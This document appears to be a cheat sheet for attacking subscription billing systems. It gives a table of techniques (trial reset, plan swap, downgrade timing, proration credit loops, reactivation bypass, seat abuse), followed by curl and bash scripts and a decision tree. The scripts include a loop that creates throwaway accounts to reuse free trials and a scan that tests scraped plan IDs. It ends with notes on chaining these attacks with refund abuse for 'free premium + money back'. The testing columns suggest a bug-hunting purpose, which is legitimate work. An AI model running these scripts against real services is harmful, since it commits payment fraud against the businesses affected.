# SUBSCRIPTION ABUSE — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **Trial Reset** | plan_id in JS | `curl -X POST /api/subscribe -d '{"plan":"pro","trial":true}'` then cancel: `curl -X DELETE /api/subscription` then re-subscribe | New trial granted (no charge) | "Trial previously used" |
| **Plan Swap** | Multiple plan_ids | `curl -X POST /api/plan/change -H "Cookie: A" -d '{"plan_id":"enterprise_premium"}'` | Premium features active with basic payment | 403/plan validation |
| **Downgrade-at-edge** | Upgrade API returns 200 async | `curl -X POST /api/upgrade -d '{"plan":"pro"}'` then `curl -X POST /api/refund` before billing snapshot | Pro features accessible, no charge on Stripe | Sync billing (charged immediately) |
| **Proration Loop** | proration_credit field | `UP; DOWN; UP; DOWN; curl /api/credits` | Credit balance increases with each cycle | proration has floor=0 |
| **Reactivation Bypass** | subscription.status | `curl -X POST /api/subscription/reactivate` after cancel+charge fails | Active without paying past_due | Reactivation requires payment |
| **Seat Abuse** | seats/quantity param | `curl -X POST /api/team/add -d '{"email":"x@x.com"}'` add 50 users then remove before bill | Feature usage without seat cost | Per-seat billing pro-rata |

## CURL COMMANDS
```bash
# Trial reset loop
for try in 1 2 3; do
  email="user+${try}@test.com"
  sid=$(curl -s -X POST /api/auth/signup -d "email=$email&pass=X" | jq -r '.session')
  curl -s -X POST /api/subscribe -d '{"plan":"pro","trial":true}' -H "Cookie: session=$sid"
  curl -s -X DELETE /api/subscription -H "Cookie: session=$sid"
  echo "Try $try: $(curl -s /api/feature/premium -H "Cookie: session=$sid" | head -c 50)"  # Still 200?
done

# Plan ID enumeration
grep -oP 'plan_[a-z0-9_]+' target.js | sort -u | while read plan; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST /api/plan -d "plan=$plan" -H "Cookie: A")
  echo "$plan → $code"
done

# Check Stripe/charge records (confirm real impact)
curl -s -X GET /api/billing/invoices -H "Cookie: A" | jq '.data[].amount_due'
```

## DECISION TREE
```
Found plan_id in response?
├─ Can change plan_id to another value?
│  ├─ 200 → check if premium features unlocked → PREMIUM ABUSE
│  └─ 403 → authorization present, try other attacks
├─ Can start trial multiple times?
│  ├─ Yes → INFINITE TRIAL (chain: create N accounts → abuse N trials)
│  └─ No → trial lock works, move on
└─ Can cancel and still access features?
   ├─ Yes → CANCEL-TIMING ABUSE
   └─ No → server validates on access
```

## CHAIN
Subscription Abuse + Refund Abuse = Free premium + money back
Subscription Abuse + Mass Assignment = Enterprise features at basic price
